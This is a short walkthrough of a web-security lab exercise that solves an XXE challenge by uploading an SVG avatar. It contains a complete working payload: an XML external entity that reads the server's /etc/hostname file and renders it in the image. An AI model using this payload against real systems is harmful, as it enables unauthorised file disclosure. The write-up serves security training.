# Lab: Exploiting XXE via image file upload

> Lab Objective: upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

- Try uploading an avatar in the comments section.

- The avatar is in svg extension, and the content is:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY fetch SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="23" x="8" y="28">&fetch;</text>
</svg>
```

- Submit the comment, then view the uploaded avatar, you'll be able to read the `/etc/hostname` content.
  ![1st screenshot](./attachments/1.png)

- Copy that value then submit it, and the lab is solved successfully.
  ![2nd screenshot](./attachments/2.png)

---
